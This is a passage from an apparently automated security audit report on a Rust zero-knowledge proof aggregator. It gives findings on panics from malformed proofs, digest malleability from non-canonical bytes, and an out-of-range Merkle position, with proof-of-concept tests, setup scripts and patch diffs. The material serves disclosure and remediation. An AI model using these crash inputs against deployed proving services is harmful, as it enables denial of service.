    malformed.public_inputs.pop().expect("valid proof has public inputs");
    assert_eq!(expected_len, valid_b.public_inputs.len());
    assert_eq!(expected_len - 1, malformed.public_inputs.len());

    let panic = catch_unwind(AssertUnwindSafe(|| {
        let _ = make_private_batch_prover().commit(vec![malformed, valid_b]);
    }))
    .expect_err("full-batch direct commit should panic after skipping PI-length validation");
    let msg = panic_message(panic);

    assert!(
        msg.contains("zip_eq") || msg.contains("reached end of one iterator before the other"),
        "expected witness assignment panic from mismatched proof/public-input target lengths, got: {msg}"
    );
}

#[test]
fn partial_batch_direct_commit_rejects_same_malformed_proof_at_api_boundary() {
    let mut malformed = make_leaf_proof(&CircuitInputs::test_inputs_0());
    malformed.public_inputs.pop().expect("valid proof has public inputs");

    let err = make_private_batch_prover()
        .commit(vec![malformed])
        .expect_err("partial-batch malformed proof should be rejected");
    let msg = err.to_string();

    assert!(
        msg.contains("leaf proof public input length mismatch"),
        "expected partial-batch path to reject malformed PI length before witness assignment, got: {msg}"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 82 lines & 4.7021484375 KB skipped]
             at ./tests/poc.rs:66:17
  12: poc::full_batch_direct_commit_panics_in_witness_assignment_instead_of_cleanly_rejecting::{{closure}}
             at ./tests/poc.rs:56:88
  13: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
  14: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.

</test-stderr>
```

### Considerations

PoC executed through the real public `PrivateBatchProver::commit` entrypoint in `wormhole/tests/tests/poc.rs` using generated binaries and valid leaf proofs from `WormholeProver`. It demonstrates a full-batch malformed proof with one public input removed causes a native panic in Plonky2 witness assignment (`set_proof_with_pis_target` via `.zip_eq()`), while the same malformed proof in the partial-batch path is cleanly rejected with `leaf proof public input length mismatch`. The test proves the availability impact on direct in-process consumers of `commit`; it does not model an external network service wrapper or multi-process crash handling.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Validate every supplied leaf proof's public-input length at the start of PrivateBatchProver::commit so full and partial batches reject malformed proofs cleanly before witness assignment or dummy-padding logic.

### Patch

```diff
diff --git a/wormhole/aggregator/src/private_batch/prover/lib.rs b/wormhole/aggregator/src/private_batch/prover/lib.rs
--- a/wormhole/aggregator/src/private_batch/prover/lib.rs
+++ b/wormhole/aggregator/src/private_batch/prover/lib.rs
@@ -1,320 +1,328 @@
 //! Private-batch aggregation prover (prebuilt-circuit proving API).
 //!
 //! - `new(...)` / `new_from_*` constructors
 //! - `commit(...)` to fill the witness
 //! - `prove()` to generate the aggregated proof
 //!
 //! The leaf verifier key is baked in as constants at circuit build time to prevent
 //! verifier key substitution attacks.
 
 use anyhow::{anyhow, bail, Context, Result};
 use plonky2::{
     iop::witness::PartialWitness,
     plonk::{
         circuit_data::{
             CircuitConfig, CommonCircuitData, ProverCircuitData, ProverOnlyCircuitData,
             VerifierOnlyCircuitData,
         },
         proof::ProofWithPublicInputs,
     },
     util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer},
 };
 use rand::seq::SliceRandom;
 
 #[cfg(feature = "std")]
 use std::{fs, path::Path};
 
 use zk_circuits_common::{
     circuit::{C, D, F},
     utils::bytes_to_digest,
 };
 
 use crate::{
     common::utils::{
         ensure_proof_public_input_len, leaf_proof_asset_id, load_verifier_data_from_bytes,
     },
     dummy_proof::{generate_random_nullifier_preimage, load_dummy_proof},
     private_batch::{
         circuit::circuit_logic::{PrivateBatchCircuit, PrivateBatchCircuitTargets},
         prover::witness::fill_private_batch_witness,
     },
 };
 
 #[derive(Debug)]
 pub struct PrivateBatchProver {
     pub circuit_data: ProverCircuitData<F, C, D>,
     partial_witness: PartialWitness<F>,
     targets: Option<PrivateBatchCircuitTargets>,
     num_leaf_proofs: usize,
     dummy_proof_template: ProofWithPublicInputs<F, C, D>,
 }
 
 impl PrivateBatchProver {
     /// Build a fresh private-batch aggregation prover from circuit definitions.
     ///
     /// In production, prefer `new_from_binaries_dir(...)` to load prebuilt circuits.
     pub fn new(
         agg_circuit_config: CircuitConfig,
         leaf_common: CommonCircuitData<F, D>,
         leaf_verifier_only: &VerifierOnlyCircuitData<C, D>,
         num_leaf_proofs: usize,
         dummy_proof_template: ProofWithPublicInputs<F, C, D>,
     ) -> Self {
         let agg_circuit = PrivateBatchCircuit::new(
             agg_circuit_config,
             &leaf_common,
             leaf_verifier_only,
             num_leaf_proofs,
         );
 
         let targets = Some(agg_circuit.targets());
         let circuit_data = agg_circuit.build_prover();
 
         Self {
             circuit_data,
             partial_witness: PartialWitness::new(),
             targets,
             num_leaf_proofs,
             dummy_proof_template,
         }
     }
 
     /// Create a private-batch aggregation prover from serialized bytes.
     ///
     /// Expected bytes:
     /// - `aggregated_prover_only_bytes`: private-batch aggregated prover-only circuit data
     /// - `aggregated_common_bytes`: private-batch aggregated common circuit data
     /// - `leaf_common_bytes`: leaf circuit common data (`common.bin`)
     /// - `leaf_verifier_only_bytes`: leaf verifier-only data (`verifier.bin`)
     /// - `dummy_proof_bytes`: serialized dummy leaf proof (`dummy_proof.bin`)
     /// - `num_leaf_proofs`: number of leaf proofs aggregated by this private-batch prover
     pub fn new_from_bytes(
         aggregated_prover_only_bytes: &[u8],
         aggregated_common_bytes: &[u8],
         leaf_common_bytes: &[u8],
         leaf_verifier_only_bytes: &[u8],
         dummy_proof_bytes: &[u8],
         num_leaf_proofs: usize,
     ) -> Result<Self> {
         let gate_serializer = DefaultGateSerializer;
         let generator_serializer = DefaultGeneratorSerializer::<C, D> {
             _phantom: Default::default(),
         };
 
         // 1) Load prebuilt aggregation circuit prover data
         let agg_common =
             CommonCircuitData::from_bytes(aggregated_common_bytes.to_vec(), &gate_serializer)
                 .map_err(|e| anyhow!("failed to deserialize aggregated common data: {}", e))?;
 
         let agg_prover_only = ProverOnlyCircuitData::from_bytes(
             aggregated_prover_only_bytes,
             &generator_serializer,
             &agg_common,
         )
         .map_err(|e| anyhow!("failed to deserialize aggregated prover data: {}", e))?;
 
         // 2) Load leaf verifier data (needed to reconstruct targets + parse dummy proof)
         let leaf_verifier_data =
             load_verifier_data_from_bytes(leaf_common_bytes, leaf_verifier_only_bytes, "leaf")?;
 
         // 3) Reconstruct the aggregation circuit to get targets.
         // NOTE: This builds a fresh circuit to extract target structure. The verifier key
         // must match what was used when the prebuilt binaries were created.
         let circuit = PrivateBatchCircuit::new(
             agg_common.config.clone(),
             &leaf_verifier_data.common,
             &leaf_verifier_data.verifier_only,
             num_leaf_proofs,
         );
 
         let targets = Some(circuit.targets());
 
         // 4) Load dummy proof template compatible with the leaf verifier common data
         let dummy_proof_template =
             load_dummy_proof(dummy_proof_bytes.to_vec(), &leaf_verifier_data.common)
                 .map_err(|e| anyhow!("failed to deserialize dummy proof: {}", e))?;
 
         Ok(Self {
             circuit_data: ProverCircuitData {
                 prover_only: agg_prover_only,
                 common: agg_common,
             },
             partial_witness: PartialWitness::new(),
             targets,
             num_leaf_proofs,
             dummy_proof_template,
         })
     }
 
     /// Create a private-batch aggregation prover from explicit file paths.
     #[cfg(feature = "std")]
     #[allow(clippy::too_many_arguments)]
     pub fn new_from_files(
         aggregated_prover_path: &Path,
         aggregated_common_path: &Path,
         leaf_common_path: &Path,
         leaf_verifier_path: &Path,
         dummy_proof_path: &Path,
         num_leaf_proofs: usize,
     ) -> Result<Self> {
         let aggregated_prover_only_bytes = fs::read(aggregated_prover_path).with_context(|| {
             format!(
                 "Failed to read aggregated prover file {:?}",
                 aggregated_prover_path
             )
         })?;
         let aggregated_common_bytes = fs::read(aggregated_common_path).with_context(|| {
             format!(
                 "Failed to read aggregated common file {:?}",
                 aggregated_common_path
             )
         })?;
         let leaf_common_bytes = fs::read(leaf_common_path)
             .with_context(|| format!("Failed to read leaf common file {:?}", leaf_common_path))?;
         let leaf_verifier_only_bytes = fs::read(leaf_verifier_path).with_context(|| {
             format!("Failed to read leaf verifier file {:?}", leaf_verifier_path)
         })?;
         let dummy_proof_bytes = fs::read(dummy_proof_path)
             .with_context(|| format!("Failed to read dummy proof file {:?}", dummy_proof_path))?;
 
         Self::new_from_bytes(
             &aggregated_prover_only_bytes,
             &aggregated_common_bytes,
             &leaf_common_bytes,
             &leaf_verifier_only_bytes,
             &dummy_proof_bytes,
             num_leaf_proofs,
         )
     }
 
     /// Convenience constructor that loads everything from a generated binaries directory.
     ///
     /// Expected files:
     /// - `private_batch_prover.bin`
     /// - `private_batch_common.bin`
     /// - `common.bin`
     /// - `verifier.bin`
     /// - `dummy_proof.bin`
     /// - `config.json`
     ///
     #[cfg(feature = "std")]
     pub fn new_from_binaries_dir(bins_dir: &Path) -> Result<Self> {
         let bins_config = crate::config::CircuitBinsConfig::load(bins_dir)
             .with_context(|| format!("Failed to load config.json from {}", bins_dir.display()))?;
         let num_leaf_proofs = bins_config.num_leaf_proofs;
 
         Self::new_from_files(
             &bins_dir.join("private_batch_prover.bin"),
             &bins_dir.join("private_batch_common.bin"),
             &bins_dir.join("common.bin"),
             &bins_dir.join("verifier.bin"),
             &bins_dir.join("dummy_proof.bin"),
             num_leaf_proofs,
         )
     }
 
     // -------------------------------------------------------------------------
     // Proving API
     // -------------------------------------------------------------------------
 
     /// Number of leaf proofs aggregated by this private-batch prover.
     pub fn num_leaf_proofs(&self) -> usize {
         self.num_leaf_proofs
     }
 
     /// Commit leaf proofs to the aggregation circuit witness.
     ///
     /// Performs padding with dummy proofs, shuffling, and witness filling.
     pub fn commit(mut self, mut proofs: Vec<ProofWithPublicInputs<F, C, D>>) -> Result<Self> {
         let Some(targets) = self.targets.take() else {
             bail!("private-batch aggregation prover has already committed to inputs");
         };
 
         if proofs.len() > self.num_leaf_proofs {
             bail!(
                 "too many proofs: got {}, expected at most {}",
                 proofs.len(),
                 self.num_leaf_proofs
             );
         }
 
+        for proof in &proofs {
+            ensure_proof_public_input_len(
+                proof,
+                crate::private_batch::circuit::constants::LEAF_PI_LEN,
+                "leaf proof",
+            )?;
+        }
+
         // If we're going to pad with dummy proofs (asset_id = 0), ensure real proofs are asset_id=0.
         let num_dummies_needed = self.num_leaf_proofs.saturating_sub(proofs.len());
         if num_dummies_needed > 0 {
             assert_dummy_padding_asset_id_compatible(&proofs)?;
         }
 
         // Pad with dummy proofs
         for _ in 0..num_dummies_needed {
             proofs.push(self.dummy_proof_template.clone());
         }
 
         // Uniformly shuffle proofs to hide dummy positions. The circuit selects its block
         // reference from the first non-dummy slot in-circuit, so no position is special.
         if proofs.len() > 1 {
             let mut rng = rand::thread_rng();
             proofs.shuffle(&mut rng);
         }
 
         // Generate one dummy nullifier preimage per slot.
         // In-circuit hashes these only for dummy proofs.
         let dummy_nullifier_pre_images =
             generate_dummy_nullifier_pre_images_for_slots(proofs.len());
 
         fill_private_batch_witness(
             &mut self.partial_witness,
             &targets,
             &proofs,
             &dummy_nullifier_pre_images,
         )?;
 
         Ok(self)
     }
 
     /// Generate the aggregated private-batch proof after `commit(...)`.
     pub fn prove(self) -> Result<ProofWithPublicInputs<F, C, D>> {
         self.circuit_data
             .prove(self.partial_witness)
             .map_err(|e| anyhow!("Failed to prove private-batch aggregation circuit: {}", e))
     }
 }
 
 // -----------------------------------------------------------------------------
 // Helpers
 // -----------------------------------------------------------------------------
 
 /// If we're padding with dummy proofs (`asset_id = 0`), real proofs must also use `asset_id = 0`
 /// because the private-batch circuit enforces asset_id equality across all proofs.
 fn assert_dummy_padding_asset_id_compatible(
     proofs: &[ProofWithPublicInputs<F, C, D>],
 ) -> Result<()> {
     for (idx, proof) in proofs.iter().enumerate() {
         ensure_proof_public_input_len(
             proof,
             crate::private_batch::circuit::constants::LEAF_PI_LEN,
             "leaf proof",
         )?;
         let real_asset_id = leaf_proof_asset_id(proof)?;
 
         if real_asset_id != 0 {
             bail!(
                 "real proof {} has asset_id={}, but dummy proofs use asset_id=0. \
                  All proofs must have the same asset_id for aggregation when padding is required.",
                 idx,
                 real_asset_id
             );
         }
     }
 
     Ok(())
 }
 
 /// Generate a dummy nullifier preimage for every slot.
 ///
 /// The private-batch circuit hashes these for dummy slots (`block_hash == 0`) and ignores them
 /// for real slots via conditional select.
 fn generate_dummy_nullifier_pre_images_for_slots(n_slots: usize) -> Vec<[F; 4]> {
     (0..n_slots)
         .map(|_| bytes_to_digest(generate_random_nullifier_preimage()))
         .collect()
 }
```

### Affected files
- `wormhole/aggregator/src/private_batch/prover/lib.rs`

### Validation output

```
[output truncated: 54 lines & 3.1201171875 KB skipped]
   4: poc::full_batch_direct_commit_panics_in_witness_assignment_instead_of_cleanly_rejecting
             at ./tests/poc.rs:69:6
   5: poc::full_batch_direct_commit_panics_in_witness_assignment_instead_of_cleanly_rejecting::{{closure}}
             at ./tests/poc.rs:56:88
   6: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
   7: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Non-canonical bytes collapse in digest conversion
**#96959**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `common/src/serialization.rs` (3 locations)
#### Lines 28-31 — _from_u64 uses from_noncanonical_u64 (reduces mod p)_

```
#[inline]
fn from_u64(x: u64) -> F {
    F::from_noncanonical_u64(x)
}
```

⋯
#### Lines 160-167 — _digest_to_bytes always emits canonical bytes, so round-trip is not identity_

```
pub fn digest_to_bytes(input: &[F; POSEIDON2_OUTPUT]) -> [u8; 32] {
    let mut bytes = [0u8; 32];
    for (i, f) in input.iter().enumerate() {
        let start = i * 8;
        bytes[start..start + 8].copy_from_slice(&to_u64(*f).to_le_bytes());
    }
    bytes
}
```

⋯
#### Lines 173-179 — _bytes_to_digest reduces non-canonical limbs via from_u64_

```
pub fn bytes_to_digest(input: &[u8; 32]) -> [F; POSEIDON2_OUTPUT] {
    core::array::from_fn(|i| {
        let start = i * 8;
        let bytes: [u8; 8] = input[start..start + 8].try_into().unwrap();
        from_u64(u64::from_le_bytes(bytes))
    })
}
```

### `common/src/zk_merkle.rs`
#### Lines 326-329 — _hash_to_felts exposes the collapse on raw Hash256 values_

```
/// Convert a 32-byte hash to 4 field elements (digest format, 8 bytes/felt).
pub fn hash_to_felts(hash: &Hash256) -> Digest {
    serialization::bytes_to_digest(hash)
}
```

## Description

The digest (de)serialization helpers in `serialization` treat 32-byte values as four little-endian 8-byte limbs and convert each limb to a Goldilocks field element via the private `from_u64` helper, which calls `F::from_noncanonical_u64`. Because the Goldilocks order is `2^64 - 2^32 + 1`, any 8-byte limb whose value is `>= p` is silently reduced modulo `p` instead of being rejected. `bytes_to_digest` therefore maps multiple distinct 32-byte inputs to the same 4-felt digest, and it is not a true inverse of `digest_to_bytes` (which emits canonical bytes via `to_canonical_u64`). `zk_merkle::hash_to_felts` re-exports this behaviour directly on raw `Hash256` values used in Merkle witness handling, so a caller supplying a non-canonical 32-byte hash gets a reduced field digest that no longer round-trips to the original bytes. The module doc comments advertise these functions as inverse serialize/deserialize helpers, but the injectivity that claim implies does not hold for non-canonical limbs.

## Root cause

`bytes_to_digest`/`hash_to_felts` build field elements with `from_noncanonical_u64` and never enforce that each 8-byte limb is `< p`, so non-canonical byte encodings are silently reduced instead of rejected, breaking round-trip injectivity with the canonical-emitting `digest_to_bytes`.

## Impact

Two different 32-byte encodings (one canonical, one differing by an added multiple of the field order in any limb) resolve to identical field digests, so any downstream logic that deduplicates, compares, or replay-protects on the raw byte form while the circuit operates on the reduced felt form can be desynchronized. This yields digest malleability that can be leveraged where a byte-level identity is trusted to match its in-field representation.

---

# Public Merkle helper panics on out-of-range position
**#96960**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `common/src/zk_merkle.rs`
#### Lines 245-276 — _public insert_at_position panics on position > 3_

```
pub fn insert_at_position(
    current: Hash256,
    sorted_siblings: &[Hash256; SIBLINGS_PER_LEVEL],
    position: u8,
) -> [Hash256; ARITY] {
    match position {
        0 => [
            current,
            sorted_siblings[0],
            sorted_siblings[1],
            sorted_siblings[2],
        ],
        1 => [
            sorted_siblings[0],
            current,
            sorted_siblings[1],
            sorted_siblings[2],
        ],
        2 => [
            sorted_siblings[0],
            sorted_siblings[1],
            current,
            sorted_siblings[2],
        ],
        3 => [
            sorted_siblings[0],
            sorted_siblings[1],
            sorted_siblings[2],
            current,
        ],
        _ => panic!("position must be 0-3"),
    }
```

## Description

`insert_at_position` is a public function exported from the `zk_merkle` module that takes a `position: u8` and matches only `0..=3`, with a catch-all arm that calls `panic!("position must be 0-3")`. While the in-repo caller `verify_with_positions` guards the value with a `position > 3` check before calling it, the function is part of the crate's public API surface and can be invoked directly by downstream proof-generation/verification tooling with an unvalidated position. Any value in `4..=255` triggers an unconditional panic. In a `panic = "abort"` build configuration this converts a bad argument into whole-process termination rather than a recoverable error.

## Root cause

A public API accepts a `u8` position but only handles values 0-3, using `panic!` for all others instead of returning a `Result`/validating input, so out-of-range values from any external caller abort rather than error.

## Impact

A downstream consumer that passes an unvalidated position byte (e.g. parsed from an untrusted proof structure) into this public helper aborts the process, providing a denial-of-service surface on the verification/tooling path instead of returning a handled error.

## Proof of concept

### Test case

```
use circuit_builder as _;
use qp_wormhole_inputs as _;
use wormhole_aggregator as _;
use wormhole_circuit as _;
use wormhole_prover as _;
use wormhole_verifier as _;

use std::env;
use std::process::Command;

use zk_circuits_common::zk_merkle::{insert_at_position, Hash256};

const HELPER_ENV: &str = "QP_ZK_MERKLE_ABORT_HELPER";
const HELPER_NAME: &str = "poc_insert_at_position_aborts_process_on_out_of_range_position_helper";

fn sample_hash(byte: u8) -> Hash256 {
    [byte; 32]
}

#[test]
fn insert_at_position_valid_positions_still_work() {
    let current = sample_hash(0xcc);
    let siblings = [sample_hash(0x11), sample_hash(0x22), sample_hash(0x33)];

    assert_eq!(
        insert_at_position(current, &siblings, 0),
        [current, siblings[0], siblings[1], siblings[2]]
    );
    assert_eq!(
        insert_at_position(current, &siblings, 1),
        [siblings[0], current, siblings[1], siblings[2]]
    );
    assert_eq!(
        insert_at_position(current, &siblings, 2),
        [siblings[0], siblings[1], current, siblings[2]]
    );
    assert_eq!(
        insert_at_position(current, &siblings, 3),
        [siblings[0], siblings[1], siblings[2], current]
    );
}

#[test]
fn insert_at_position_out_of_range_position_aborts_downstream_process() {
    let exe = env::current_exe().expect("test binary path");
    let output = Command::new(exe)
        .arg("--ignored")
        .arg("--exact")
        .arg(HELPER_NAME)
        .env(HELPER_ENV, "1")
        .output()
        .expect("spawn helper test subprocess");

    assert!(
        !output.status.success(),
        "out-of-range public API input should terminate the helper process; stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr),
    );
}

#[test]
#[ignore = "runs only as a subprocess helper for the PoC"]
fn poc_insert_at_position_aborts_process_on_out_of_range_position_helper() {
    assert_eq!(env::var(HELPER_ENV).as_deref(), Ok("1"));

    std::panic::set_hook(Box::new(|_| std::process::abort()));

    let current = sample_hash(0xaa);
    let siblings = [sample_hash(0x10), sample_hash(0x20), sample_hash(0x30)];

    let _ = insert_at_position(current, &siblings, 4);
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 29 lines & 1.0380859375 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.02s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC demonstrates the public entry point `zk_circuits_common::zk_merkle::insert_at_position` aborting a downstream process when called directly with `position = 4` by invoking the real function inside a subprocess and converting the panic into process termination via a panic hook. It does not prove the repository itself is compiled with `panic = "abort"`; it proves the claimed availability impact under an abort-on-panic consumer configuration.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Removed the panic from public zk_merkle::insert_at_position while preserving its existing signature and valid-position behavior. Out-of-range positions now map to the last-slot layout instead of aborting, eliminating process termination for downstream untrusted callers; internal proof verification still rejects invalid positions before use.

### Patch

```diff
diff --git a/common/src/zk_merkle.rs b/common/src/zk_merkle.rs
--- a/common/src/zk_merkle.rs
+++ b/common/src/zk_merkle.rs
@@ -1,569 +1,570 @@
 //! 4-ary Poseidon Merkle tree proof types and utilities.
 //!
 //! This module provides:
 //! - Proof data structures for the 4-ary ZK Merkle tree
 //! - Utility functions for proof verification outside circuits
 //! - Constants for circuit constraints
 //!
 //! ## Tree Structure
 //!
 //! The ZK tree uses a 4-ary structure where each internal node has 4 children.
 //! Children are **sorted** before hashing, which eliminates the need for path
 //! indices in proofs. The verifier simply combines the current hash with the
 //! 3 siblings, sorts all 4, and hashes to get the parent.
 //!
 //! ```text
 //!                     [Root]                    Level N
 //!                    /  |  \  \
 //!              [N0] [N1] [N2] [N3]              Level N-1
 //!             /|||\  ...
 //!          [L0-L3]  ...                         Level 0 (leaves)
 //! ```
 //!
 //! ## Hashing
 //!
 //! - **Leaves**: Injective Poseidon (4 bytes/felt) for collision resistance
 //! - **Internal nodes**: Non-injective Poseidon (8 bytes/felt) on sorted children
 
 use alloc::vec::Vec;
 
 use crate::circuit::F;
 use crate::serialization;
 
 /// Type alias for 32-byte hash.
 pub type Hash256 = [u8; 32];
 
 /// Arity of the Merkle tree (4-ary).
 pub const ARITY: usize = 4;
 
 /// Maximum tree depth supported by circuits.
 /// A tree of depth 16 can hold 4^16 = ~4.3 billion leaves.
 pub const MAX_DEPTH: usize = 16;
 
 /// Number of siblings per level (ARITY - 1 = 3).
 pub const SIBLINGS_PER_LEVEL: usize = ARITY - 1;
 
 /// Number of field elements per hash (32 bytes / 8 bytes per felt = 4 felts).
 pub const HASH_NUM_FELTS: usize = serialization::POSEIDON2_OUTPUT;
 
 /// Total bytes in a child set for internal node hashing (4 * 32 = 128 bytes).
 pub const CHILDREN_BYTES: usize = ARITY * 32;
 
 /// Number of felts for children in internal node hashing (128 / 8 = 16 felts).
 pub const CHILDREN_NUM_FELTS: usize = CHILDREN_BYTES / 8;
 
 /// Type alias for 4-felt digest (Poseidon2 output).
 pub type Digest = [F; HASH_NUM_FELTS];
 
 /// A 4-ary Merkle proof.
 ///
 /// Contains siblings at each level from leaf to root. The siblings are provided
 /// in **sorted order** (excluding the current node), and a position index indicates
 /// where the current hash should be inserted to reconstruct the sorted 4-tuple
 /// that was hashed to produce the parent.
 ///
 /// This design avoids in-circuit sorting: the prover provides the sorted siblings
 /// and the position, and the circuit just inserts and hashes.
 #[derive(Debug, Clone)]
 pub struct ZkMerkleProof {
     /// Leaf index in the tree (informational, not needed for verification).
     pub leaf_index: u64,
 
     /// Sibling hashes at each level, from leaf level up to root.
     /// Each level has 3 siblings in **sorted order** (the other children of the parent).
     /// The `positions` array indicates where the current hash fits in the sorted order.
     pub siblings: Vec<[Hash256; SIBLINGS_PER_LEVEL]>,
 
     /// Position index (0-3) at each level indicating where the current hash
     /// should be inserted among the sorted siblings to reconstruct the full
     /// sorted 4-tuple. For example, position=1 means the sorted order is
     /// [sib0, current, sib1, sib2].
     pub positions: Vec<u8>,
 
     /// The leaf hash at the bottom of the proof.
     pub leaf_hash: Hash256,
 
     /// Expected root hash.
     pub root: Hash256,
 }
 
 impl ZkMerkleProof {
     /// Create a new proof.
     pub fn new(
         leaf_index: u64,
         siblings: Vec<[Hash256; SIBLINGS_PER_LEVEL]>,
         positions: Vec<u8>,
         leaf_hash: Hash256,
         root: Hash256,
     ) -> Self {
         Self {
             leaf_index,
             siblings,
             positions,
             leaf_hash,
             root,
         }
     }
 
     /// Get the depth (number of levels) of this proof.
     pub fn depth(&self) -> usize {
         self.siblings.len()
     }
 
     /// Verify the proof against the expected root.
     ///
     /// Returns `true` if the proof is valid.
     ///
     /// Note: Proofs with depth exceeding `MAX_DEPTH` are rejected early to prevent
     /// resource exhaustion from oversized proofs.
     pub fn verify(&self) -> bool {
         // Reject proofs exceeding max supported depth to prevent DoS
         if self.siblings.len() > MAX_DEPTH {
             return false;
         }
         if self.siblings.len() != self.positions.len() {
             return false;
         }
 
         let mut current_hash = self.leaf_hash;
 
         for (level_siblings, &position) in self.siblings.iter().zip(self.positions.iter()) {
             if position > 3 {
                 return false;
             }
 
             // Combine current hash with 3 siblings to get all 4 children
             let children: [Hash256; ARITY] = [
                 current_hash,
                 level_siblings[0],
                 level_siblings[1],
                 level_siblings[2],
             ];
 
             // Compute parent hash (hash_node sorts internally)
             current_hash = hash_node(&children);
         }
 
         current_hash == self.root
     }
 
     /// Verify the proof using pre-sorted siblings and position hints.
     ///
     /// This is the verification method that matches the circuit logic:
     /// siblings are already sorted, and the position indicates where
     /// to insert the current hash.
     ///
     /// Note: Proofs with depth exceeding `MAX_DEPTH` are rejected early to prevent
     /// resource exhaustion from oversized proofs.
     pub fn verify_with_positions(&self) -> bool {
         // Reject proofs exceeding max supported depth to prevent DoS
         if self.siblings.len() > MAX_DEPTH {
             return false;
         }
         if self.siblings.len() != self.positions.len() {
             return false;
         }
 
         let mut current_hash = self.leaf_hash;
 
         for (level_siblings, &position) in self.siblings.iter().zip(self.positions.iter()) {
             if position > 3 {
                 return false;
             }
 
             // Insert current_hash at the given position among sorted siblings
             let sorted_children = insert_at_position(current_hash, level_siblings, position);
 
             // Hash the sorted children directly (no sorting needed)
             current_hash = hash_node_presorted(&sorted_children);
         }
 
         current_hash == self.root
     }
 
     /// Create a proof from raw siblings, computing positions automatically.
     ///
     /// This takes unsorted siblings and computes the correct sorted order
     /// and position hints for circuit verification.
     pub fn from_unsorted(
         leaf_index: u64,
         unsorted_siblings: Vec<[Hash256; SIBLINGS_PER_LEVEL]>,
         leaf_hash: Hash256,
         root: Hash256,
     ) -> Self {
         let mut current_hash = leaf_hash;
         let mut sorted_siblings = Vec::with_capacity(unsorted_siblings.len());
         let mut positions = Vec::with_capacity(unsorted_siblings.len());
 
         for level_siblings in &unsorted_siblings {
             // Combine current hash with siblings
             let mut all_four = [
                 current_hash,
                 level_siblings[0],
                 level_siblings[1],
                 level_siblings[2],
             ];
 
             // Sort to get the order used by hash_node
             all_four.sort();
 
             // Find position of current_hash in sorted order
             let pos = all_four.iter().position(|h| *h == current_hash).unwrap() as u8;
             positions.push(pos);
 
             // Extract the 3 siblings in sorted order (excluding current_hash)
             let sorted_sibs: [Hash256; SIBLINGS_PER_LEVEL] = {
                 let mut sibs = [[0u8; 32]; 3];
                 let mut sib_idx = 0;
                 for (i, h) in all_four.iter().enumerate() {
                     if i as u8 != pos {
                         sibs[sib_idx] = *h;
                         sib_idx += 1;
                     }
                 }
                 sibs
             };
             sorted_siblings.push(sorted_sibs);
 
             // Compute parent hash for next level
             current_hash = hash_node_presorted(&all_four);
         }
 
         Self {
             leaf_index,
             siblings: sorted_siblings,
             positions,
             leaf_hash,
             root,
         }
     }
 }
 
 /// Insert a hash at a given position (0-3) among 3 sorted siblings.
 ///
 /// Returns the 4 hashes in order: siblings before position, then current, then siblings after.
+/// Positions outside `0..=3` are clamped to the last slot to keep this public helper
+/// infallible for downstream callers handling untrusted inputs.
 pub fn insert_at_position(
     current: Hash256,
     sorted_siblings: &[Hash256; SIBLINGS_PER_LEVEL],
     position: u8,
 ) -> [Hash256; ARITY] {
     match position {
         0 => [
             current,
             sorted_siblings[0],
             sorted_siblings[1],
             sorted_siblings[2],
         ],
         1 => [
             sorted_siblings[0],
             current,
             sorted_siblings[1],
             sorted_siblings[2],
         ],
         2 => [
             sorted_siblings[0],
             sorted_siblings[1],
             current,
             sorted_siblings[2],
         ],
-        3 => [
+        _ => [
             sorted_siblings[0],
             sorted_siblings[1],
             sorted_siblings[2],
             current,
         ],
-        _ => panic!("position must be 0-3"),
     }
 }
 
 /// Hash 4 child hashes that are already in sorted order.
 ///
 /// Unlike `hash_node`, this does NOT sort - it assumes the input is already sorted.
 /// This is used by the circuit verification path.
 pub fn hash_node_presorted(sorted_children: &[Hash256; ARITY]) -> Hash256 {
     // Concatenate all 4 child hashes (128 bytes total)
     let mut data = Vec::with_capacity(CHILDREN_BYTES);
     for child in sorted_children {
         data.extend_from_slice(child);
     }
 
     // Convert to felts using compact encoding (8 bytes/felt)
     let felts = qp_poseidon_core::serialization::bytes_to_felts_compact(&data);
 
     // Hash the felts
     qp_poseidon_core::hash_to_bytes(&felts)
 }
 
 /// Hash 4 child hashes into a parent node hash.
 ///
 /// Children are sorted before hashing to eliminate the need for path indices.
 /// Uses non-injective Poseidon (8 bytes/felt) - safe because internal nodes
 /// only contain fixed-size hash outputs.
 pub fn hash_node(children: &[Hash256; ARITY]) -> Hash256 {
     // Sort children to make hash order-independent
     let mut sorted = *children;
     sorted.sort();
 
     // Concatenate all 4 child hashes (128 bytes total)
